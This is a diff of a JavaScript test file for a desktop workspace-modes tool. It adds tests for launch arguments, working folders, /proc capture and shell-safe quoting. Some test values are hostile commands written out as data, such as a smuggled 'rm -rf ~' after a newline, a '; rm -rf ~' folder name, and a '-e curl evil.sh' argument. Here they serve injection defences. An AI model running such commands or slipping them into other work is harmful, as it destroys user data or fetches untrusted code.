@@ -198,11 +198,11 @@ test("settings-only activation never launches apps or runs commands", () => {
 
 test("an application is either a desktop entry or a raw command, never both", () => {
   assert.deepEqual(Model.normalizeApplication("ghostty"),
-    { uid: "", desktopId: "", command: "ghostty", workspace: null, note: "", enabled: true })
+    { uid: "", desktopId: "", command: "ghostty", args: "", directory: "", workspace: null, note: "", enabled: true })
   assert.deepEqual(Model.normalizeApplication({ desktopId: "org.foo.Bar" }),
-    { uid: "", desktopId: "org.foo.Bar", command: "", workspace: null, note: "", enabled: true })
+    { uid: "", desktopId: "org.foo.Bar", command: "", args: "", directory: "", workspace: null, note: "", enabled: true })
   assert.deepEqual(Model.normalizeApplication({ desktopId: "a", command: "b" }),
-    { uid: "", desktopId: "a", command: "", workspace: null, note: "", enabled: true })
+    { uid: "", desktopId: "a", command: "", args: "", directory: "", workspace: null, note: "", enabled: true })
   // A uid is only carried, never invented, so a lone application is still the
   // same object it was; normalizeMode is what mints one.
   assert.equal(Model.normalizeApplication({ desktopId: "a", uid: "keep-me" }).uid, "keep-me")
@@ -663,6 +663,141 @@ test("two windows of the same app on one workspace capture as one entry", () => 
   assert.deepEqual(captured.applications.map(a => a.workspace), [1, 2])
 })
 
+test("a folder is stored the way you would type it, and expanded once", () => {
+  assert.equal(Model.collapseHome("/home/me/Projects", "/home/me"), "~/Projects")
+  assert.equal(Model.collapseHome("/home/me", "/home/me"), "~")
+  assert.equal(Model.collapseHome("/etc/nginx", "/home/me"), "/etc/nginx")
+  // Not a prefix match on the string: /home/melissa is not inside /home/me.
+  assert.equal(Model.collapseHome("/home/melissa/x", "/home/me"), "/home/melissa/x")
+
+  assert.equal(Model.expandHome("~/Projects", "/home/me"), "/home/me/Projects")
+  assert.equal(Model.expandHome("~", "/home/me"), "/home/me")
+  assert.equal(Model.expandHome("/etc/nginx", "/home/me"), "/etc/nginx")
+  // A leading ~ that is not a path segment is a folder called "~something".
+  assert.equal(Model.expandHome("~weird", "/home/me"), "~weird")
+  assert.equal(Model.expandHome(Model.collapseHome("/home/me/a/b", "/home/me"), "/home/me"),
+    "/home/me/a/b")
+})
+
+test("an application carries what to run it with and where to run it", () => {
+  const app = Model.normalizeApplication({
+    desktopId: "foot", args: "-e btop", directory: "~/Projects/"
+  })
+  assert.equal(app.args, "-e btop")
+  // A trailing slash is not part of the folder's identity.
+  assert.equal(app.directory, "~/Projects")
+
+  // Both end up in a shell command line, so neither gets to carry a newline.
+  const sneaky = Model.normalizeApplication({
+    command: "foot", args: "-e btop\nrm -rf ~", directory: "~/a\nb"
+  })
+  assert.equal(sneaky.args.indexOf("\n"), -1)
+  assert.equal(sneaky.directory.indexOf("\n"), -1)
+
+  // And neither is unbounded.
+  const long = Model.normalizeApplication({ command: "x", args: "a".repeat(9000) })
+  assert.ok(long.args.length <= 512)
+})
+
+test("what a window runs is on the plan, not just on the pane", () => {
+  const mode = Model.normalizeMode({
+    id: "a", name: "A",
+    applications: [{ desktopId: "foot", args: "-e btop", directory: "~/Projects", workspace: 1 }]
+  }, [])
+  const step = Model.activationPlan(mode, {}).filter(s => s.kind === "applications")[0]
+  assert.equal(step.desktopId, "foot")
+  assert.equal(step.args, "-e btop")
+  assert.equal(step.directory, "~/Projects")
+  // The label is what the log shows, so it has to say which foot this is.
+  assert.match(step.label, /-e btop/)
+})
+
+test("the detail line prefers what a window runs over where it runs", () => {
+  assert.equal(Model.applicationDetail(
+    Model.normalizeApplication({ desktopId: "foot", args: "-e btop", directory: "~/p" })), "-e btop")
+  assert.equal(Model.applicationDetail(
+    Model.normalizeApplication({ desktopId: "foot", directory: "~/p" })), "~/p")
+  assert.equal(Model.applicationDetail(
+    Model.normalizeApplication({ desktopId: "foot" })), "")
+})
+
+test("an import preview shows the arguments and the folder, not just the app", () => {
+  const preview = Model.importPreview([Model.normalizeMode({
+    id: "a", name: "A",
+    applications: [{ desktopId: "foot", args: "-e curl evil.sh", directory: "~/Projects" }]
+  }, [])])
+  // Consent is to the whole command line. An argument that runs something is
+  // exactly the part a count would have hidden.
+  assert.deepEqual(preview[0].runs, ["app  foot.desktop -e curl evil.sh  (in ~/Projects)"])
+})
+
+// -------------------------------------------------- capture from /proc
+
+test("capture keeps the arguments you would recognise and drops the launcher's", () => {
+  const home = "/home/me"
+  // A browser: pages of its own flags, and the one URL you opened.
+  assert.equal(Model.captureArguments(
+    ["/usr/lib/chromium/chromium", "--ozone-platform=wayland", "--enable-crashpad",
+      "https://omarchy.org"], home), "https://omarchy.org")
+
+  // A terminal: everything after -e is the command, flags and all.
+  assert.equal(Model.captureArguments(["foot", "-e", "btop", "--tree"], home), "-e btop --tree")
+
+  // An Electron app is launched with its own bundle. That is the program
+  // talking about itself, not a document you opened.
+  assert.equal(Model.captureArguments(["/usr/lib/electron/electron", "/usr/lib/code/out/main.js"],
+    home), "")
+
+  // A file you did open, written the way you would type it.
+  assert.equal(Model.captureArguments(["nautilus", "/home/me/Projects"], home), "~/Projects")
+
+  // argv[0] is never an argument, and a bare word is kept as-is.
+  assert.equal(Model.captureArguments(["kitty", "btop"], home), "btop")
+  assert.equal(Model.captureArguments([], home), "")
+  assert.equal(Model.captureArguments(["foot"], home), "")
+})
+
+test("capture records the folder only when it says something", () => {
+  const home = "/home/me"
+  assert.equal(Model.captureDirectory("/home/me/Projects", home), "~/Projects")
+  // Home is where everything starts, so recording it is recording nothing.
+  assert.equal(Model.captureDirectory("/home/me", home), "")
+  assert.equal(Model.captureDirectory("/", home), "")
+  // A pid the probe could not read produces no folder at all.
+  assert.equal(Model.captureDirectory("", home), "")
+})
+
+test("a process's command line survives the probe's tab-separated line", () => {
+  const sep = Model.PROC_ARG_SEPARATOR
+  const probe = Model.parseProbeOutput(
+    "PROC\t4242\t/home/me/Projects\tfoot" + sep + "-e" + sep + "btop" + sep + "\n")
+  assert.deepEqual(probe.processes["4242"].argv, ["foot", "-e", "btop"])
+  assert.equal(probe.processes["4242"].cwd, "/home/me/Projects")
+
+  // An argument is allowed to contain a space, which is why the join is not one.
+  const spaced = Model.parseProbeOutput("PROC\t7\t/tmp\tcode" + sep + "/home/me/My Notes\n")
+  assert.deepEqual(spaced.processes["7"].argv, ["code", "/home/me/My Notes"])
+
+  // Same closed-record rule as `missing`: a pid cannot be "constructor".
+  assert.equal(Object.getPrototypeOf(probe.processes), null)
+  assert.equal(Model.parseProbeOutput("PROC\tconstructor\t/\tx\n").processes.constructor,
+    undefined)
+})
+
+test("two terminals running different things capture as two entries", () => {
+  const captured = Model.captureMode({
+    windows: [
+      { desktopId: "foot", workspace: 1, args: "-e btop" },
+      { desktopId: "foot", workspace: 1, directory: "~/Projects" },
+      // Same app, same workspace, same command: still one entry.
+      { desktopId: "foot", workspace: 1, args: "-e btop" }
+    ]
+  })
+  assert.equal(captured.applications.length, 2)
+  assert.deepEqual(captured.applications.map(a => a.args), ["-e btop", ""])
+  assert.deepEqual(captured.applications.map(a => a.directory), ["", "~/Projects"])
+})
+
 test("an empty desktop captures as an empty, still-valid mode", () => {
   const captured = Model.captureMode({})
   assert.equal(captured.name, "Current desktop")
@@ -706,7 +841,7 @@ test("no example modes ship: blank is the only template", () => {
 })
 
 test("the bar mark is drawn in the theme's colour, not loaded as an image", () => {
-  const mark = read("OmaraMark.qml")
+  const mark = read("ModesMark.qml")
   // Drawn, whatever it is drawn out of — Rectangles today, a Shape before
   // that. What matters is that no pixels are loaded and the colour comes from
   // the theme, not which primitive happens to be enough for the shape.
@@ -714,15 +849,15 @@ test("the bar mark is drawn in the theme's colour, not loaded as an image", () =
   assert.doesNotMatch(mark, /\.(png|svg|jpg)/i, "the mark must not name an image file")
   assert.match(mark, /property color color: Color\.foreground/)
   const bar = read("BarWidget.qml")
-  assert.match(bar, /OmaraMark \{/)
+  assert.match(bar, /ModesMark \{/)
   assert.match(bar, /color: root\.foreground/)
   // A PNG in the bar cannot follow the theme; the logo belongs in the README.
-  assert.ok(!/assets\/omara\.png/.test(bar), "the bar should not load the logo image")
+  assert.ok(!/assets\/wsmodes\.png/.test(bar), "the bar should not load the logo image")
 })
 
 test("nothing user-visible still says context", () => {
   for (const file of ["README.md", "manifest.json", "BarWidget.qml", "EditorWindow.qml",
-    "ModeForm.qml", "ModeRow.qml", "Service.qml", "bin/omara"]) {
+    "ModeForm.qml", "ModeRow.qml", "Service.qml", "bin/wsmodes"]) {
     const source = read(file)
     // The one allowed mention is reading the old config file by its old name.
     const hits = source.split("\n").filter((line) => /\bcontexts?\b/i.test(line))
@@ -898,7 +1033,7 @@ test("automatic and scripted switches never wait on the dialog", () => {
   const service = read("Service.qml")
   assert.match(service, /activateMode\(ctx\.id, \{ windows: "keep" \}\)/)
   assert.match(service, /function activateWindows\(id: string, mode: string\)/)
-  assert.match(read("bin/omara"), /--close\) result=\$\(call activateWindows/)
+  assert.match(read("bin/wsmodes"), /--close\) result=\$\(call activateWindows/)
 })
 
 test("settings expose the window question", () => {
@@ -940,7 +1075,7 @@ test("the bar widget exposes the three names the shell's summon routing calls", 
 
 test("the service registers the IPC target the CLI talks to", () => {
   const qml = read("Service.qml")
-  assert.match(qml, /target: "omara"/)
+  assert.match(qml, /target: "wsmodes"/)
   for (const method of ["list", "current", "activate", "deactivate", "reload", "manage", "edit", "capture"])
     assert.match(qml, new RegExp("function " + method + "\\("), "missing IPC method " + method)
 })
@@ -1002,6 +1137,85 @@ test("application launches never hand a user string to a shell for parsing", () 
   assert.doesNotMatch(qml, /execDetached\(\["bash", "-lc", parsed/)
 })
 
+test("a folder reaches the shell as an argument, never spliced into the script", () => {
+  const qml = read("Service.qml")
+  const body = fnBody(qml, "function execDetachedIn(argv, directory)")
+  // The script is one of two constants. The folder rides in the argv, where
+  // `cd -- "$1"` cannot read a name like `; rm -rf ~` as anything but a name.
+  assert.match(body, /cd -- "\$1" \|\| exit 1; shift; exec "\$@"/)
+  assert.doesNotMatch(body, /"-lc", *[a-z_]*\+/)
+  assert.match(body, /\.concat\(extra, argv\)/)
+
+  // The workspace path has no argv to ride in, so every word is quoted
+  // instead — including the folder.
+  const line = fnBody(qml, "function shellLineFor(argv, directory)")
+  assert.match(line, /Util\.shellQuote\(argv\[i\]\)/)
+  assert.match(line, /"cd -- " \+ Util\.shellQuote\(directory\)/)
+})
+
+test("arguments and a folder are the reason to bypass gtk-launch, not to skip it", () => {
+  const body = fnBody(read("Service.qml"), "function launchDesktopEntry(desktopId, args, directory, workspace)")
+  // With neither, nothing changes: the launch still goes through the app
+  // daemon, which is what puts it in its own systemd scope.
+  assert.match(body, /if \(extra\.argv\.length > 0 \|\| dir !== ""\)/)
+  assert.match(body, /uwsm-app/)
+  assert.match(body, /gtk-launch/)
+  // An unbalanced quote is refused rather than guessed at.
+  assert.match(body, /extra\.unterminated/)
+})
+
+test("modes written under the old name are adopted once, and never resurrected", () => {
+  const qml = read("Service.qml")
+  assert.match(qml, /legacyConfigPath: home \+ "\/\.config\/omarchy\/omara\.json"/)
+
+  const load = fnBody(qml, "function loadConfigFromDisk()")
+  // Only on a first load that found nothing, and only once: after you have
+  // deleted every mode, the old file must not bring them back on the poll.
+  assert.match(load, /verdict === "absent" && !service\.configLoaded && !service\.legacyChecked/)
+  assert.match(load, /service\.legacyChecked = true/)
+
+  const adopt = fnBody(qml, "function adoptLegacyConfig()")
+  // Read, load, save under the new name. Nothing is moved or deleted, so the
+  // old file is still there if this was the wrong call.
+  assert.match(adopt, /service\.loadConfig\(text\)/)
+  assert.match(adopt, /service\.save\(\)/)
+  assert.doesNotMatch(adopt, /\brm\b|unlink|mv /)
+  // lastWrittenText is cleared first, or the save decides it is already done.
+  assert.match(adopt, /service\.lastWrittenText = ""[\s\S]*?service\.save\(\)/)
+})
+
+test("a mode is renamed where its icon is chosen, and nowhere else", () => {
+  const picker = read("IconPicker.qml")
+  assert.match(picker, /id: nameField/)
+  assert.match(picker, /setDraft\("name", nameField\.text\)/)
+
+  // A TextField commits on editingFinished, which a hidden overlay never
+  // reaches, so every exit commits the name first.
+  const commit = fnBody(picker, "function commitName()")
+  assert.match(commit, /root\.editor\.setDraft/)
+  for (const exit of ["root.cleared()", "root.dismissed()", "root.chosen(String(modelData.g))"])
+    assert.ok(picker.includes("root.commitName(); " + exit),
+      `${exit} should commit the name on the way out`)
+
+  // The options form routes to the same overlay instead of holding a second
+  // name field that could disagree with it.
+  const form = read("ModeForm.qml")
+  assert.doesNotMatch(form, /placeholderText: "Name"/)
+  assert.match(form, /id: identityField/)
+  assert.match(fnBody(form, "function focusFirstField()"), /identityField/)
+})
+
+test("a pane says what it runs, and lets you say it", () => {
+  const canvas = read("WorkspaceCanvas.qml")
+  // The detail line is the only thing telling two Foots apart on a board.
+  assert.match(canvas, /Model\.applicationDetail\(pane\.app\)/)
+  for (const field of ["command", "args", "directory"])
+    assert.match(canvas, new RegExp(`setApplicationField\\(pane\\.modelData\\.app, "${field}"`))
+  // Inputs only once a pane is picked and only where a field fits, so a board
+  // of panes stays a board of names.
+  assert.match(canvas, /readonly property bool editing: chosen && app/)
+})
+
 test("probe output is bounded and cannot inherit from Object.prototype", () => {
   const probe = Model.parseProbeOutput(
     "WALLPAPER\t/home/a/bg.jpg\nTHEME\tgruvbox\nAPP\tmissing\tsteam\nAPP\tok\tghostty\n")
@@ -1023,9 +1237,9 @@ test("probe output is bounded and cannot inherit from Object.prototype", () => {
   const huge = Model.parseProbeOutput("WALLPAPER\t" + "x".repeat(200000))
   assert.ok(huge.wallpaper.length <= 4096)
 
-  // A closed record: three known keys, whatever the output says.
+  // A closed record: four known keys, whatever the output says.
   assert.deepEqual(Object.keys(Model.parseProbeOutput("EVIL\tx\nWALLPAPER\ta")).sort(),
-    ["missing", "theme", "wallpaper"])
+    ["missing", "processes", "theme", "wallpaper"])
 })
 
 test("a guarded read reports a closed set of verdicts, and caps the body", () => {
@@ -1141,7 +1355,7 @@ test("the config read carries its own guarantees instead of checking first", () 
   // Writes publish through a fresh 0600 temp and a rename, so a symlink or a
   // FIFO at the target is replaced rather than written through.
   assert.match(qml, /umask 077/)
-  assert.match(qml, /mktemp "\$dir\/\.omara\.XXXXXX"/)
+  assert.match(qml, /mktemp "\$dir\/\.wsmodes\.XXXXXX"/)
   assert.match(qml, /mv -f -- "\$tmp" "\$target"/)
   // An incomplete check refuses; a guard that can be removed by breaking it
   // is not a guard.
